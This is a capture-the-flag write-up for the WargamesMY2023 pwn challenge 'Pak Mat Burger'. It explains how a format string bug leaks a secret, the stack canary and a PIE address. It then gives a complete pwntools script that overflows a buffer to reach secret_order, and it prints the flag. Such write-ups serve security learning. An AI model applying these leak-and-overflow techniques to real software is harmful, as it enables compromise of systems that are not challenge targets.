---
title : "Pak Mat Burger [pwn]"
categories: WargamesMY2023
---

Format string attack to leak information to perform buffer overflow on binary with stack protection + PIE.

*PS: I didn't solve this during the contest because skill issue :')*

[pakmatburger.zip]({{ site.url }}/files/wgmy2023/pakmatburger.zip){: .btn .btn--info}

# Analysis

The program reads an environment variable `SECRET_MESSAGE` and first asks the user to enter this value correctly. If we look at the Dockerfile, we see that this environment variable is populated at container creation within `start.sh`, and has 8 bytes of value (8 hex characters).

```
# Generate a new random SECRET_MESSAGE for each connection
export SECRET_MESSAGE=$(openssl rand -hex 4 2>/dev/null)
```

The comment is a big big lie that I only realised after the competition ended. The value will stay the same for each connection because the container isn't recreated every time.

Using `checksec`, we see that the program has full protection on (PIE, stack canary, NX).

{% include image.html url="/assets/images/wgmy2023/pakmatburger_program.png" description="Very short and simple program" %}

We notice that there is a format string vulnerability, and if we enter the value of the environment variable correctly, we get access to a buffer overflow vulnerability since `s` has size 10 only.

The goal here is to alter control flow into `secret_order` where the flag is printed to us.

{% include image.html url="/assets/images/wgmy2023/pakmatburger_secret_order.png" description="" %}

# Solution

We know for certain we have to leak these values using format string attack.

1. Environment variable `SECRET_MESSAGE`
2. Stack canary (to buffer overflow with stack protection)
3. Any PIE address value (to calculate PIE base)

By using GDB to break right before the vulnerable `printf` is called, we see that the pointer of `SECRET_MESSAGE` is at the top of the stack.

{% include image.html url="/assets/images/wgmy2023/pakmatburger_gdb.png" description="" %}

The stack canary can be found at `$rsp + 0x38`. We know this since it looks quite random and also because it is right above `$rbp`. A typical stack frame looks like:

```
+-----------------+
|                 |
| local variables |
|                 |
+-----------------+
|  stack canary   |
+-----------------+
|    saved RBP    |
+-----------------+
| return address  |
+-----------------+
        ...
```

For PIE address, I used the one at `$rsp + 0x58`, which is the address of `main` that was passed in as an argument to `__libc_start_main`.

To leak values on the stack, we can use the parameter field of format strings. Since 6 registers are used for parameters before the stack is used, the first value on the stack will be referred to with `%6$p` (or other formats than `p`). Since we are working with 64 bit programs, each increment of the field will go to the next 8 bytes (word size).

Something like this:

```python
def offset_to_fmt(offset, fmt):
    return f"%{6 + offset // 8}${fmt}"
```

The 3 values and their offsets with respect to `$rsp`:
1. `SECRET_MESSAGE`: 0x00
2. Stack canary: 0x38
3. `main` address: 0x58

However, the final format string to leak all at once would be more than 11 characters long. But since `SECRET_MESSAGE` stays the same, we can leak it first, then only leak the latter two values in a new connection.

After getting the address of `main`, we subtract that by its offset to get the PIE base address, which is then added by the offset of `secret_order` to get the actual address of `secret_order`.

Finally, for the buffer overflow, we will need a padding of `0x25` since the buffer `s` is at `rbp-2Dh` according to IDA.

> 0x2D = 0x25 (padding) + 0x8 (stack canary)

The final payload will be: padding + stack canary + padding for saved rbp + address of `secret_order`

# Final Script
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("pakmat_burger_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        context.log_level = "debug"
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        context.log_level = "debug"
        r = remote("13.229.150.169", 34061)

    return r

def offset_to_fmt(offset, fmt):
    return f"%{6 + offset // 8}${fmt}"

def get_secret():
    r = conn()

    fmt_str = offset_to_fmt(0, "s")
    r.sendlineafter(b": ", fmt_str.encode())

    r.recvuntil(b" ")
    secret_msg = r.recvn(8)

    r.close()
    return secret_msg

def main():
    secret_msg = get_secret()

    r = conn()
    pause()

    # rsp offsets
    canary_offset = 0x0038
    main_addr_offset = 0x0058

    fmt_str = offset_to_fmt(canary_offset, "p") + offset_to_fmt(main_addr_offset, "p")
    r.sendlineafter(b": ", fmt_str.encode())

    r.recvuntil(b" ")
    canary = int(r.recvn(18).decode(), 16)
    main_addr = int(r.recvuntil(b",")[:-1], 16)
    exe.address = main_addr - exe.sym["main"]

    info("canary: " + hex(canary))
    info("main addr: " + hex(main_addr))
    info("pie base: " + hex(exe.address))

    r.sendlineafter(b": ", secret_msg)

    r.recvline()
    r.sendline(b"anything")

    secret_order = exe.sym["secret_order"]

    payload = b"A" * 0x25 + p64(canary) + b"B" * 8 + p64(secret_order + 5)
    r.sendlineafter(b": ", payload)

    print(r.recvall())

if __name__ == "__main__":
    main()
```

Flag: `wgmy{4a029bf40a28039c8492acfa866f8d96}`
